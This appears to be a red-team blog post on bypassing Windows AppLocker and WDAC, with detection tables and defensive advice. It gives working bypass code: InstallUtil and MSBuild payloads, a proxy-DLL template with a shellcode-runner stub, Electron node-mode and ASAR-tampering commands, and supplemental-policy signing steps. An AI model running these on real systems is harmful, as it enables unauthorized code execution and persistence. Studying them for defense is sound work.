---
title: "Modern AppLocker & WDAC Evasion: Trusted Execution, LOLBins, and Real-World Tradecraft"
description: The post I wish I'd had when I started landing on hardened Windows boxes for the first time. What AppLocker and WDAC actually do under the hood, the techniques that still work in 2026, the ones that are now front-and-center in every EDR, and the corners most write-ups skip, Managed Installer abuse, ISG, supplemental policies, and BYOVD with HVCI in the way. With code, diagrams, and references to how FIN7, Lazarus, BlackByte, and Raspberry Robin actually do it on real engagements.
date: 2026-05-10 12:00:00 +0545
categories: [Research, Red Team]
tags: [red-team, edr-evasion, windows-internals, malware-dev, pentest, osep]
pin: true
toc: true
mermaid: true
---

> **Lab disclaimer:** authorized engagements and lab study only. The defensive section is the part to forward to your blue team.

> **OpSec scope:** this is the application-control half. EDR evasion (AMSI patching, ETW patching, syscall stub generation, sleep mask, scriptblock logging suppression) is a different problem I'm not covering here. A real payload pairs the two. Treat what follows as the half that gets your bytes executing, not the half that hides them.

## I. Intro

Three things show up when someone says "application allowlisting on Windows":

- **SmartScreen.** Cloud reputation. MOTW games and signing defeat it. Not the topic.
- **AppLocker.** User-mode rules (path / hash / publisher), service plus filter driver. Free, GPO-deployable, almost everywhere.
- **WDAC.** Kernel-mode policy enforced by `CI.dll`. Two engines: **UMCI** for user-mode binaries and scripts, **KMCI** for drivers. Either can be Off, Audit, or Enforce.

The split that matters in practice: KMCI is widely enforced (don't let random drivers load). UMCI is rare and almost always paired with EDR, MDM, and a managed installer. Box with UMCI enforce, HVCI on, CLM in PowerShell, you're working hard for everything. KMCI only, AppLocker is the whole game.

Two assumptions for the rest of the post: standard-user execution, no admin unless I say so.

One thing worth saying up front. An AppLocker bypass is not an EDR bypass. The LOLBin techniques you'll read about, InstallUtil, MSBuild, regasm, MSHTA, were novel a decade ago. In 2026 they're high-confidence detections on every major EDR. Triggering one means you got past the policy and the SOC got an alert in the same breath. Plan accordingly.

## II. Enumeration

Read the policy before you touch it. Every block is an alert.

### AppLocker

```powershell
Get-AppLockerPolicy -Effective -Xml | Out-File C:\Users\Public\al.xml
```

You're looking for three things:

1. Which rule collections are configured (`Exe`, `Dll`, `Script`, `Msi`, `Appx`) and whether they're Enforce or AuditOnly. AuditOnly is gold, you can probe what would be blocked without being blocked.
2. Path rules over writable directories. `%TEMP%\*`, `C:\Builds\*`, anything user-writable. Drop zone.
3. Whether the `Dll` collection is `NotConfigured`. It usually is. DLL evaluation is expensive and most orgs skip it. That makes DLL hijacking the cheapest move on the box.

Audit failures hit event **8003 / 8006**, enforce blocks hit **8004 / 8007**. SOCs alert on 8004. They often don't read 8003.

### WDAC

```powershell
$dg = Get-CimInstance -ClassName Win32_DeviceGuard `
        -Namespace root\Microsoft\Windows\DeviceGuard
$dg | Format-List CodeIntegrityPolicyEnforcementStatus,
                  UsermodeCodeIntegrityPolicyEnforcementStatus,
                  SecurityServicesRunning
```

Quick decode: the two `*EnforcementStatus` fields are `0` off, `1` audit, `2` enforce. `SecurityServicesRunning` contains `1` for Credential Guard, `2` for HVCI. Active policies under `C:\Windows\System32\CodeIntegrity\CIPolicies\Active\*.cip`. Multiple `.cip` files mean a base policy plus supplementals, that's a separate offensive surface, more on it later.

PowerShell language mode is the other tell:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

`ConstrainedLanguage` means UMCI is enforced for unsigned scripts. Most public PowerShell offensive tooling is dead under CLM.

WDAC enforcement events are **3076** (would have blocked, audit) and **3077** (blocked, enforce). Policy refresh, including a freshly-dropped supplemental, fires **3099**. SOC subscribes to all three or they should.

## III. AppLocker

Most bypasses come down to abusing something Microsoft already trusts. Pick the cheapest one for your visibility budget.

### InstallUtil and MSBuild

Both still work. Both are detected loudly by Defender for Endpoint, CrowdStrike, SentinelOne, out of the box, no tuning needed. The detection isn't the binary, it's the lineage. `installutil.exe → cmd.exe` is the alert.

I rarely lead with these anymore. When I do, it's because there's no Electron app installed and DLL hijacking didn't pan out. If you need the code:

```csharp
// payload.cs
using System;
using System.Configuration.Install;
using System.ComponentModel;
using System.Diagnostics;

[RunInstaller(true)]
public class P : Installer {
  public override void Uninstall(System.Collections.IDictionary s) {
    Process.Start("cmd", "/c whoami > C:\\Users\\Public\\proof.txt");
  }
}
```

```powershell
csc.exe /target:exe /reference:System.Configuration.Install.dll payload.cs
InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

MSBuild inline tasks compile C# in-memory inside `MSBuild.exe`. Same shape, different runner:

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="P"><X /></Target>
  <UsingTask TaskName="X" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task><Code Type="Class" Language="cs"><![CDATA[
      using System.Diagnostics;
      using Microsoft.Build.Utilities;
      public class X : Task {
        public override bool Execute() {
          Process.Start("cmd","/c whoami > C:\\Users\\Public\\proof.txt");
          return true;
        }
      }
    ]]></Code></Task>
  </UsingTask>
</Project>
```

Both are on Microsoft's recommended block list. Many WDAC policies don't include it. Verify.

### DLL hijacking

The `Dll` collection being NotConfigured opens this up. Two flavors I actually use:

- **Phantom hijack.** Procmon for `Result: NAME NOT FOUND` paths in a whitelisted EXE, drop a DLL there.
- **Proxy DLL** alongside a portable app. The EXE keeps working because all exports forward to the real DLL, you ride along.

```c
#include <windows.h>
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW")
// one /export per real DLL export

DWORD WINAPI Run(LPVOID p) { /* shellcode runner */ return 0; }
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID _) {
  if (r == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(h);
    CreateThread(0, 0, Run, 0, 0, 0);
  }
  return TRUE;
}
```

Tooling: SharpDLLProxy, Spartacus, Robber. Pick by what's easiest to install on your operator workstation.

Lower signal than the LOLBin runners if you target an EXE the user actually launches. High signal if you sideload from `%TEMP%`. WDAC with DLL enforcement on kills this entirely. Unsigned proxy DLLs are denied at load. In practice, less than 10% of WDAC deployments I see have DLL enforcement on.

### Electron, the practical AppLocker bypass

This is where I have the most fun on engagements. Electron apps are universally allowlisted (Slack, Teams, VS Code, Discord, Obsidian) and every one ships a full Node.js runtime that doesn't care about CLM.

The four reliable vectors:

```powershell
# 1. Inspect debug flag
& "$env:LOCALAPPDATA\slack\slack.exe" --inspect=9229
# chrome://inspect, paste 127.0.0.1:9229, eval JS inside the Slack process

# 2. ELECTRON_RUN_AS_NODE, the signed binary becomes a bare Node runtime
$env:ELECTRON_RUN_AS_NODE = "1"
& "$env:LOCALAPPDATA\Programs\Microsoft VS Code\Code.exe" -e `
    "require('child_process').exec('cmd /c whoami > C:\\Users\\Public\\proof.txt')"

# 3. Custom --app
& "...\some-electron-app.exe" --app="C:\Users\Public\evilapp"
```

ASAR tampering is the persistence play. Modify the JS, the user's own next Slack launch runs it inside the trusted Slack process.

```powershell
$asar = "$env:LOCALAPPDATA\slack\app-4.42.0\resources\app.asar"
npx --yes asar extract $asar app_src

Add-Content .\app_src\dist\preload.js -Value @"
const { exec } = require('child_process');
exec('cmd /c whoami > C:\\Users\\Public\\proof.txt');
"@

npx --yes asar pack app_src $asar
```

Where in the asar matters. Modern Electron defaults are `nodeIntegration: false` and `contextIsolation: true`, so renderer JS can't `require`. Target the **preload script** (privileged isolated world, still has Node) or the **main process** (`main.js` named in `package.json`, always Node-enabled).

Electron 22+ ships an asar integrity fuse. Many vendors don't enable it because shipping post-install patches becomes painful. Check the binary before you bother extracting.

Why this is the quiet option in 2026: most EDR behavioral detections key on `cmd.exe` or `powershell.exe` as children. From inside Node you can do most post-exploitation in pure JS, file copy, registry via `winreg`, HTTP exfil with `fetch`, raw sockets, and never spawn a shell. `ELECTRON_RUN_AS_NODE` also sidesteps CLM entirely because Node isn't PowerShell.

What catches this is the `--inspect` CLI flag or the `ELECTRON_RUN_AS_NODE` environment variable on a process. Most EDRs surface command line, fewer surface env vars.

### Developer workstations

Engineering boxes are almost always the soft target. The allowlist is shaped around letting devs work, which means whitelisting every runtime they touch.

| Surface | What you abuse |
|---|---|
| VS Code `tasks.json` | `Ctrl+Shift+B` runs whatever shell command the task says |
| VS Code extensions | Run JS in the extension host, same trust as ELECTRON_RUN_AS_NODE |
| npm `preinstall` / `postinstall` | Shell command on every `npm install` |
| Python venv activate | `activate.bat` / `Activate.ps1` if you can write the venv dir |
| NuGet `BeforeBuild` target | Arbitrary `<Exec>` on every `dotnet build` |
| Self-hosted CI runners | Workflow YAML executes; whoever can land a PR has code exec |
| Git hooks | `pre-commit`, `post-checkout` on every git op |

All of these look indistinguishable from normal dev work. Detection in this space is thin outside mature shops.

## IV. WDAC

User-mode tricks die the moment UMCI is on. What's left in 2026:

### Managed Installer abuse, the underdiscussed one

WDAC's escape hatch for environments that ship software via SCCM, Intune, or other patch managers. You designate certain installer processes ("managed installers") as trusted, and anything they write to disk is trusted automatically. Otherwise no enterprise could keep up with explicit allow rules for every package.

The trust travels via NTFS. When a managed installer writes a file, the AppLocker filter driver `appid.sys` attaches an extended attribute named `$KERNEL.SMARTLOCKER.ORIGINCLAIM`. WDAC checks it at execution time. The `$KERNEL.` namespace is kernel-only, user-mode code can read EAs but can't forge them. That's the trust root.

You can see the EA with `fsutil`:

```powershell
fsutil file queryEa "C:\Windows\CCMCache\<package-guid>\setup.exe"
# Ea Name: $KERNEL.SMARTLOCKER.ORIGINCLAIM ...
```

Propagation matters operationally:

| Operation | EA survives? |
|---|---|
| Rename / move / copy on NTFS | yes |
| Copy across NTFS volumes | yes |
| Copy to FAT32, exFAT | no |
| SMB share to non-NTFS / older SMB | no |
| `tar`, `zip` | no |
| `7z` with NTFS streams flag | sometimes |
| Browser download | no, browsers don't have MI context |

Headline: trust travels with the file, not the contents. Open an MI-deployed binary for write, rewrite the bytes, the EA still says "I came from SCCM." Foundation of every interesting MI abuse.

What I actually do with it:

- **Live off pre-tagged binaries.** Anything sitting in `C:\Windows\CCM\` or `C:\Windows\CCMCache\<guid>\` is trust-tagged forever. Sideload a DLL the usual way, the proxy DLL inherits its parent EXE's trust.
- **Pre-position via supply chain.** Compromise an SCCM packager, drop a malicious build, SCCM deploys it fleet-wide with trust tags. Out of scope for most engagements, but it happens.
- **Watch for misconfigured publisher rules.** Some orgs designate `O=Acme Corp` as a managed installer publisher. Every binary Acme ever signed runs trusted, including dev test-signing keys.

Detection in this space is thin. To the SOC it looks like normal SCCM activity.

### ISG (Intelligent Security Graph)

Cloud reputation as a trust input. Files with broad install base and clean reputation pass without an explicit rule. Aged-and-signed binaries quietly walk through. Several APT groups operationalize this: sign with a real cert (purchased, leaked, or borrowed from a compromised vendor's CI), let it age on VirusTotal, deploy. No event fires.

Enable on the policy is option 14, `Enabled:Intelligent Security Graph Authorization`. Check:

```powershell
CiTool.exe --list-policies --json | ConvertFrom-Json |
  ForEach-Object { $_.PolicyOptions } |
  Where-Object { $_ -match 'Intelligent' }
```

### Supplemental policies

A WDAC base can have N supplementals chained to it. A supplemental can only *add* allow rules, never deny. Files live under `C:\Windows\System32\CodeIntegrity\CIPolicies\Active\` and the kernel picks them up at boot or on `CiTool.exe --update-policy`.

The catch, and this is where I've seen real misconfigurations, is that the supplemental must be signed by a publisher the base trusts. Many base policies accept supplementals signed under common code-signing CAs (DigiCert, Sectigo). Any binary signed under those CAs can drop a supplemental and grant itself further trust. Aggressive base-policy design fixes this. The default doesn't.

If you have admin and a cert chained to a base-trusted root:

```powershell
ConvertFrom-CIPolicy -XmlFilePath supp.xml -BinaryFilePath supp.cip
signtool sign /v /f attacker.pfx /p ... supp.cip
copy supp.cip C:\Windows\System32\CodeIntegrity\CIPolicies\Active\
CiTool.exe --update-policy
```

Event 3099 fires on the refresh. Almost no SOCs subscribe to it.

### Working under CLM

When UMCI flips PowerShell into ConstrainedLanguage, most public tooling is dead. What's still in the bag:

**Runspaces.** The historical CLM escape was creating a new runspace and setting `SessionStateProxy.LanguageMode = "FullLanguage"`. WMF 5.1 patched it, the setter throws now. Still useful to know because the modern variation is: signed-module cmdlets run in FullLanguage even from a CLM caller. Any signed cmdlet that takes a `[ScriptBlock]` and `.Invoke()`s it gives you full power. That's the modern hunting ground.

```powershell
# Find signed modules, then inspect their .psm1 for ScriptBlock-accepting cmdlets
Get-Module -ListAvailable | ForEach-Object {
    if ((Get-AuthenticodeSignature $_.Path).Status -eq 'Valid') { $_ }
} | Select-Object Name, Path
```

**PSv2 downgrade.** PowerShell v2 predates CLM. Still installed on plenty of finance and healthcare boxes that haven't been re-imaged since 1809. Loud command line, easy detection, but FullLanguage if it lands:

```cmd
powershell.exe -Version 2 -Command "$ExecutionContext.SessionState.LanguageMode"
```

**WMI / CIM.** `Invoke-CimMethod Win32_Process.Create` spawns processes outside the PowerShell language enforcement. The new process inherits UMCI for what it runs, but it doesn't inherit CLM:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create `
    -Arguments @{ CommandLine = 'cmd /c whoami > C:\Users\Public\proof.txt' }
```

**COM.** `New-Object -ComObject` still works for many ProgIDs even in CLM. `WScript.Shell`, `Shell.Application`, `MMC20.Application` (DCOM lateral). Microsoft has tightened this over time and it depends on the exact ProgID.

### BYOVD

WDAC enforcement bits live in the kernel (`CI.dll`, the structure usually called `g_CiOptions`). You can't write them from user mode, you need kernel R/W. The signed-but-vulnerable driver ecosystem provides it: load a driver KMCI accepts, exploit its arbitrary R/W primitive, flip the enforcement bits.

Admin-already move, not a standard-user one. Loading a driver requires `SeLoadDriverPrivilege`. So BYOVD is "I have admin but I want to load unsigned kernel modules, disable EDR callbacks, or do something else CI is in the way of."

The catalog is [LOLDrivers](https://loldrivers.io), started by Michael Haag, Jose Hernandez, and Olaf Hartong in 2022. Every entry tracks: SHA256 plus Authentihash for blocklist purposes, original filename plus every rename the project has observed, signing chain, vulnerability category, MITRE mapping, and bundled detection content (YARA, Sigma, KQL, Splunk SPL).

The dataset is consumed by Microsoft for the Vulnerable Driver Blocklist, by EDR vendors for detection rules, and by red teamers for picking drivers. Rare piece of community infrastructure that moves both sides forward.

Recurring entries you see in incident reports:

| Driver | Vendor | Capability | Status |
|---|---|---|---|
| RTCore64.sys | MSI Afterburner | Arbitrary MSR + kernel R/W | Blocked. Renames everywhere |
| gdrv.sys | Gigabyte | Phys mem R/W | Blocked. Featured in Robbinhood / Baltimore |
| AsrDrv101.sys / AsIO3.sys | ASRock / Asus | Phys mem R/W | Partial, vendors keep shipping new versions |
| iqvw64e.sys | Intel | Arbitrary kernel R/W | Blocked. KDMapper still uses it |
| ene.sys | ENE RGB | Phys mem R/W | Added 2024, present on lots of gaming laptops |

The wall is HVCI. With Memory Integrity on, kernel pages backing `CI.dll` are protected by SLAT. Even a kernel write primitive can't modify `g_CiOptions`, the write traps to the hypervisor. Public BYOVD tooling dies here. The realistic attack against HVCI is a hypervisor bug, which is nation-state territory.

A few operational notes if you're going to do this on an engagement:

- Microsoft's Vulnerable Driver Blocklist is a *separate* WDAC policy from the main recommended block list. Many orgs ship one and not the other.
- Driver loads fire `Microsoft-Windows-CodeIntegrity/Operational` 3023 / 3024. EDR sees them. Modern detection content matches LOLDrivers hashes directly.
- Cross-check that the driver still works on the target Windows build. Kernel structures shift between major releases.

## V. Detections

| Technique | Primary signal | Hardness to evade |
|---|---|---|
| InstallUtil `/U` | `installutil.exe` parent, .NET assembly load from non-MS path | Easy to detect, hard to evade |
| MSBuild inline task | `msbuild.exe` outside dev lineage, .NET JIT events | Same |
| DLL hijack (phantom) | Unsigned DLL load from user-writable path | Medium, depends on the EXE you ride |
| DLL hijack (proxy of signed app) | DLL signature mismatch on legit app | Medium-high |
| Electron `--inspect` | CLI flag visible in process command line | Low signal if defenders watch CLI, many don't |
| `ELECTRON_RUN_AS_NODE` | Env var present on running process | High, most EDRs don't surface env vars |
| Electron ASAR tamper | `app.asar` mtime change, integrity-fuse failure | High, rarely monitored |
| MI pre-position | Anomalous SCCM package contents | Very high, almost no SOCs detect |
| ISG-allowed novel binary | New file with SMARTLOCKER EA from non-MI source | Very high |
| Supplemental drop | Event 3099 | High, SOCs rarely subscribe |
| BYOVD | New kernel driver, LOLDrivers hash match | Easy to detect since 2023 |
| BYOVD CI patch | EDR kernel callbacks on writes to CI.dll | Easy on EDR-protected hosts |
| PSv2 downgrade | `-Version 2` in command line | Easy |

## VI. Real-world context

None of this is theoretical. The same primitives show up over and over.

- **FIN7** runs MSBuild inline-task project files as a primary payload mechanism. Phishing drops `.xml` in `%TEMP%`, MSBuild runs it, inline task allocates RWX and runs shellcode. Mandiant flags it every year. It still works in environments that haven't tuned the relevant detections.
- **Lazarus** has run InstallUtil-style .NET stagers in South Korean defense and crypto-exchange operations. Also documented use of RTCore64 (BYOVD) to disable EDR kernel callbacks pre-Vulnerable-Driver-Blocklist.
- **BlackByte** ransomware operators deploy RTCore64 via `sc create` immediately before encryption to disable Defender's kernel callbacks. Sophos and CrowdStrike have multiple incident reports. The blocklist materially reduced the technique's success rate but renamed variants still surface.
- **Raspberry Robin** specifically targets allowlisted environments. Installer chain uses `.lnk` files on removable media, `msiexec.exe` to pull a remote MSI (signed Microsoft), then DLL hijacking inside `OneDrive.exe` and Windows Installer. Microsoft has detailed write-ups. Still active.

None of these are zero-days. They're allowlisting bypasses using documented LOLBin and trusted-app patterns. The novelty is operator discipline, not the primitive.

## VII. Defensive notes

What actually makes a target expensive for the operator, rough order of impact:

1. **WDAC base + supplemental hygiene.** Strict signer pinning on supplementals. Alert on event 3099.
2. **HVCI + Secure Boot + Microsoft Vulnerable Driver Blocklist.** Closes the BYOVD path for everyone except nation states.
3. **Microsoft Recommended Block Rules + DLL enforcement.** Real performance cost, pays for itself.
4. **Constrained Language Mode + PSv2 removed + signed-module audit.** Kills most public PowerShell tradecraft.
5. **Inventory and audit Electron apps.** Baseline `app.asar` hashes. Block `ELECTRON_RUN_AS_NODE` via environment-variable policy where the platform supports it.
6. **Behavioral detection over preventive.** AppLocker / WDAC tell you what *can* run. EDR + ETW + process-lineage tell you what *is* running. Modern actors are caught by the second.
7. **Alert on 8004, 3077, 3099 with credential-dump urgency.** They mean what they say.

## VIII. Closing

Three takeaways that survive the next round of techniques.

WDAC genuinely shrinks the attack surface. UMCI + HVCI together force operators into a much narrower lane than a defenseless box. It is not security theater.

Trusted execution is the durable weakness. Every bypass here is a coercion of something the policy already trusts. New Microsoft features keep that pattern; the lock is on the door, the door isn't quite hung straight.

Modern detection is behavioral. Half a day in a lab against your own policy beats a week reading other people's research. Pick three techniques from this post, build the lab, see whether your detections fire. If they don't, you have specific test cases for the next sprint.

### References

- [LOLBAS](https://lolbas-project.github.io) and [LOLDrivers](https://loldrivers.io).
- [Microsoft WDAC documentation](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/), policy authoring, recommended block list, MI / ISG / supplementals.
- [Microsoft Vulnerable Driver Blocklist](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules), separate from the user-mode block list.
- Matt Graeber, Bohops, Olaf Hartong, NetSPI for WDAC research.
- Casey Smith for the original AppLocker LOLBin posts.
